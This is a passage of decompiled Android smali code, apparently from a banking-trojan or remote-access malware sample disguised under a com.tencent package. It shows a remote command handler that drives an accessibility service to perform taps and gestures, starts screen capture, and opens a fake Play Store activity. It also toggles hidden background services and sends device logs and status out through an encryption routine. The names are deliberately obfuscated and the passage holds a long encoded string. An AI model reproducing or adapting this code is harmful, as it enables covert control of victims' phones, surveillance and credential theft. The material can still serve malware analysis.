    invoke-virtual {v9, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    aget-object v9, v9, v6

    invoke-static {v9}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v9

    .line 636
    new-instance v11, Landroid/graphics/Point;

    invoke-direct {v11, v10, v9}, Landroid/graphics/Point;-><init>(II)V

    aput-object v11, v4, v8

    add-int/lit8 v8, v8, 0x1

    goto :goto_5

    .line 639
    :cond_29
    sget-object v3, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    const/16 v6, 0x3e8

    invoke-virtual {v3, v4, v6}, Lcom/tencent/AccessibilityServiceCore;->mouseDraw([Landroid/graphics/Point;I)V

    goto/16 :goto_7

    .line 624
    :cond_2a
    :goto_6
    sget-object v3, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    aget-object v4, v8, v6

    const-string v6, "sp<*>"

    invoke-virtual {v4, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SW(Ljava/lang/String;)V
    :try_end_30
    .catch Ljava/lang/Exception; {:try_start_30 .. :try_end_30} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_30 .. :try_end_30} :catch_0

    goto/16 :goto_7

    .line 647
    :cond_2b
    :try_start_31
    aget-object v3, v8, v6

    const-string v4, "sc:"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_31
    .catch Ljava/lang/Exception; {:try_start_31 .. :try_end_31} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_31 .. :try_end_31} :catch_0

    if-eqz v3, :cond_36

    .line 650
    :try_start_32
    aget-object v3, v8, v6

    const-string v4, "sc:"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/tencent/PersistentService;->StartScreen(Ljava/lang/String;)V
    :try_end_32
    .catch Ljava/lang/Exception; {:try_start_32 .. :try_end_32} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_32 .. :try_end_32} :catch_0

    goto/16 :goto_7

    .line 659
    :cond_2c
    :try_start_33
    const-class v3, Lcom/tencent/SecondaryBackgroundService;

    aget-object v4, p1, v5

    invoke-static {v3, v4}, Lcom/tencent/BackgroundServiceHelper;->removedqtractort40(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v3
    :try_end_33
    .catch Ljava/lang/Exception; {:try_start_33 .. :try_end_33} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_33 .. :try_end_33} :catch_0

    if-eqz v3, :cond_2d

    .line 662
    :try_start_34
    sput-boolean v6, Lcom/tencent/MainBackgroundService;->F_tunesxconcerningn1011_ORCA:Z

    .line 663
    new-instance v3, Landroid/content/Intent;

    sget-object v4, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    const-class v6, Lcom/tencent/FakePlayStoreActivity;

    invoke-direct {v3, v4, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 664
    invoke-virtual {v3, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v4, 0x40000000    # 2.0f

    .line 665
    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v4, 0x800000

    .line 666
    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v4, 0x20000000

    .line 667
    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v4, "key"

    .line 668
    invoke-virtual {v3, v4, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[Ljava/lang/String;)Landroid/content/Intent;

    .line 669
    sget-object v4, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    invoke-virtual {v4, v3}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_34
    .catch Ljava/lang/Exception; {:try_start_34 .. :try_end_34} :catch_5
    .catch Ljava/lang/OutOfMemoryError; {:try_start_34 .. :try_end_34} :catch_0

    goto/16 :goto_7

    .line 673
    :catch_5
    :try_start_35
    new-instance v3, Landroid/content/Intent;

    aget-object v4, p1, v5

    const-class v6, Lcom/tencent/SecondaryBackgroundService;

    invoke-direct {v3, v4, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 675
    sget-object v4, Lcom/tencent/InstalledAppsScanner;->FTX1:Ljava/lang/String;

    invoke-virtual {v3, v4, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[Ljava/lang/String;)Landroid/content/Intent;

    .line 677
    aget-object v4, p1, v5

    invoke-virtual {v4, v3}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_35
    .catch Ljava/lang/Exception; {:try_start_35 .. :try_end_35} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_35 .. :try_end_35} :catch_0

    goto/16 :goto_7

    .line 686
    :cond_2d
    :try_start_36
    sput-boolean v5, Lcom/tencent/MainBackgroundService;->F_tunesxconcerningn1011_ORCA:Z

    .line 687
    new-instance v3, Landroid/content/Intent;

    aget-object v4, p1, v5

    const-class v6, Lcom/tencent/SecondaryBackgroundService;

    invoke-direct {v3, v4, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 688
    aget-object v4, p1, v5

    invoke-virtual {v4, v3}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z
    :try_end_36
    .catch Ljava/lang/Exception; {:try_start_36 .. :try_end_36} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_36 .. :try_end_36} :catch_0

    const-wide/16 v3, 0x3e8

    .line 689
    :try_start_37
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_37
    .catch Ljava/lang/InterruptedException; {:try_start_37 .. :try_end_37} :catch_6
    .catch Ljava/lang/Exception; {:try_start_37 .. :try_end_37} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_37 .. :try_end_37} :catch_0

    goto/16 :goto_7

    .line 701
    :cond_2e
    :try_start_38
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v7, v7, v11

    invoke-static {v9, v7}, Lcom/tencent/DataPackagingEngine;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_2f

    .line 702
    const-class v3, Lcom/tencent/TertiaryBackgroundService;

    aget-object v7, p1, v5

    invoke-static {v3, v7}, Lcom/tencent/BackgroundServiceHelper;->removedqtractort40(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v3

    if-eqz v3, :cond_36

    .line 703
    new-instance v3, Landroid/content/Intent;

    aget-object v7, p1, v5

    const-class v9, Lcom/tencent/TertiaryBackgroundService;

    invoke-direct {v3, v7, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    new-array v7, v4, [Ljava/lang/String;

    .line 704
    aget-object v9, v8, v6

    aput-object v9, v7, v5

    aget-object v4, v8, v4

    aput-object v4, v7, v6

    .line 705
    sget-object v4, Lcom/tencent/InstalledAppsScanner;->FTX2:Ljava/lang/String;

    invoke-virtual {v3, v4, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[Ljava/lang/String;)Landroid/content/Intent;

    .line 707
    aget-object v4, p1, v5

    invoke-virtual {v4, v3}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto/16 :goto_7

    .line 710
    :cond_2f
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v7, v7, v17

    invoke-static {v9, v7}, Lcom/tencent/DataPackagingEngine;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_30

    .line 711
    const-class v3, Lcom/tencent/TertiaryBackgroundService;

    aget-object v4, p1, v5

    invoke-static {v3, v4}, Lcom/tencent/BackgroundServiceHelper;->removedqtractort40(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v3
    :try_end_38
    .catch Ljava/lang/Exception; {:try_start_38 .. :try_end_38} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_38 .. :try_end_38} :catch_0

    if-nez v3, :cond_36

    .line 715
    :try_start_39
    new-instance v3, Landroid/content/Intent;

    aget-object v4, p1, v5

    const-class v6, Lcom/tencent/TertiaryBackgroundService;

    invoke-direct {v3, v4, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 716
    aget-object v4, p1, v5

    invoke-virtual {v4, v3}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z
    :try_end_39
    .catch Ljava/lang/Exception; {:try_start_39 .. :try_end_39} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_39 .. :try_end_39} :catch_0

    goto/16 :goto_7

    .line 725
    :cond_30
    :try_start_3a
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v7, v7, v13

    invoke-static {v9, v7}, Lcom/tencent/DataPackagingEngine;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_31

    .line 726
    aget-object v3, p1, v5

    aget-object v4, v8, v6

    invoke-static {v3, v4}, Lcom/tencent/DataPackagingEngine;->combatdpussydepinionscomg26(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_7

    .line 727
    :cond_31
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v7, v7, v16

    invoke-static {v9, v7}, Lcom/tencent/DataPackagingEngine;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_32

    .line 728
    invoke-static {v5}, Lcom/tencent/DataPackagingEngine;->rel(Z)V

    .line 729
    aget-object v3, v8, v6

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-static {v3, v4}, Lcom/tencent/DataEncryptionEngine;->agreeltimelybfacilitatez38(Ljava/lang/String;[B)V

    goto/16 :goto_7

    .line 730
    :cond_32
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v7, v7, v15

    invoke-static {v9, v7}, Lcom/tencent/DataPackagingEngine;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_33

    .line 731
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v9, v8, v6

    aput-object v9, v7, v6

    .line 733
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v9, v8, v4

    aput-object v9, v7, v4

    .line 734
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v8, v8, v3

    aput-object v8, v7, v3

    .line 737
    aget-object v3, p1, v5

    const-class v7, Lcom/tencent/AccessibilityServiceCore;

    invoke-static {v3, v7}, Lcom/tencent/DataPackagingEngine;->acc(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v3

    sput-boolean v3, Lcom/tencent/MainBackgroundService;->k:Z

    .line 739
    sget-boolean v3, Lcom/tencent/MainBackgroundService;->k:Z

    sput-boolean v3, Lcom/tencent/MainBackgroundService;->k_tunesxconcerningn1011_live:Z

    .line 740
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v6, v7, v6

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v4, v6, v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-boolean v4, Lcom/tencent/MainBackgroundService;->k:Z

    invoke-static {v4}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {}, Lcom/tencent/MainBackgroundService;->Get_tunesxconcerningn1011_Logs()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-static {v3, v4}, Lcom/tencent/DataEncryptionEngine;->agreeltimelybfacilitatez38(Ljava/lang/String;[B)V

    goto :goto_7

    .line 741
    :cond_33
    sget-object v3, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v3, v3, v14

    invoke-static {v9, v3}, Lcom/tencent/DataPackagingEngine;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_34

    .line 743
    sput-boolean v5, Lcom/tencent/MainBackgroundService;->k_tunesxconcerningn1011_live:Z

    goto :goto_7

    .line 744
    :cond_34
    sget-object v3, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    const/16 v4, 0xd

    aget-object v3, v3, v4

    invoke-static {v9, v3}, Lcom/tencent/DataPackagingEngine;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_35

    .line 745
    aget-object v3, p1, v5

    invoke-static {v3, v6}, Lcom/tencent/DataPackagingEngine;->WK_tunesxconcerningn103_L(Landroid/content/Context;Z)V

    .line 746
    aget-object v3, v8, v6

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-static {v3, v4}, Lcom/tencent/DataEncryptionEngine;->agreeltimelybfacilitatez38(Ljava/lang/String;[B)V

    goto :goto_7

    .line 747
    :cond_35
    sget-object v3, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    const/16 v4, 0xe

    aget-object v3, v3, v4

    invoke-static {v9, v3}, Lcom/tencent/DataPackagingEngine;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_36

    .line 748
    sget-boolean v3, Lcom/tencent/DataEncryptionEngine;->ec_tunesxconcerningn102_ho:Z

    if-eqz v3, :cond_36

    const-string v3, "\u02c8\u1d54\u0999\u02bf$\u02bf\u02bc\u20abhypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41\u03b8\u1d62\u05d9\u02bf\u1623\u03b8\u02c9\u02c6\u02c9\u03b8\u03c6\u02ce$\u02c9\u02ce$\ufe73\u02ca\u2db1\u2071\u1d47\u02behypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41\u02d1$\u02cf\u0640\ufe73"

    .line 749
    invoke-static {v3}, Lcom/tencent/DataEncryptionEngine;->podcastgtransitionr36(Ljava/lang/String;)V

    .line 753
    :catch_6
    :cond_36
    :goto_7
    sget-boolean v3, Lcom/tencent/DataEncryptionEngine;->q:Z

    if-nez v3, :cond_37

    .line 754
    sget-object v3, Lcom/tencent/MainBackgroundService;->L_tunesxconcerningn1011_i:Ljava/util/List;

    invoke-interface {v3}, Ljava/util/List;->clear()V

    goto :goto_8

    .line 756
    :cond_37
    sget-object v3, Lcom/tencent/MainBackgroundService;->L_tunesxconcerningn1011_i:Ljava/util/List;

    invoke-interface {v3, v5}, Ljava/util/List;->remove(I)Ljava/lang/Object;
    :try_end_3a
    .catch Ljava/lang/Exception; {:try_start_3a .. :try_end_3a} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_3a .. :try_end_3a} :catch_0

    :goto_8
    const-wide/16 v3, 0x1

    .line 758
    :try_start_3b
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V

    goto/16 :goto_0

    :cond_38
    const-wide/16 v3, 0x3e8

    .line 760
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3b
    .catch Ljava/lang/InterruptedException; {:try_start_3b .. :try_end_3b} :catch_0
    .catch Ljava/lang/Exception; {:try_start_3b .. :try_end_3b} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_3b .. :try_end_3b} :catch_0

    goto/16 :goto_0
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .line 137
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/tencent/PersistentService$ta;->onPostExecute(Ljava/lang/String;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/String;)V
    .locals 0

    .line 782
    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    return-void
.end method

.method protected onPreExecute()V
    .locals 0

    .line 140
    invoke-super {p0}, Landroid/os/AsyncTask;->onPreExecute()V

    return-void
.end method
